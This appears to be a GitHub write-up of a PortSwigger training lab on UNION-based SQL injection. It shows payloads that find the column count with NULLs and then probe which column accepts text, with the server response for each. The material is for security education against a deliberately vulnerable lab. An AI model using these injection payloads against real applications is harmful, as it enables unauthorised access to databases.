## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/bb62cddb-eff4-4e33-82b7-2a457ab0d128)

## Solution :
Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Finding out the number of columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
```

**2 NULL** returns no error , which means there are 2 columns in the database.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b8bc92f3-9631-468d-ada3-544e50f640b4)

####  Finding out which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'd',NULL --
```

Internal Server Error

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/49e9d2cc-5f43-4353-8d6f-9fe917ead767)


**2nd Column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'d' --
```
This column contains text data .

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d41987fb-4556-4e51-b0d4-4169caa0de96)


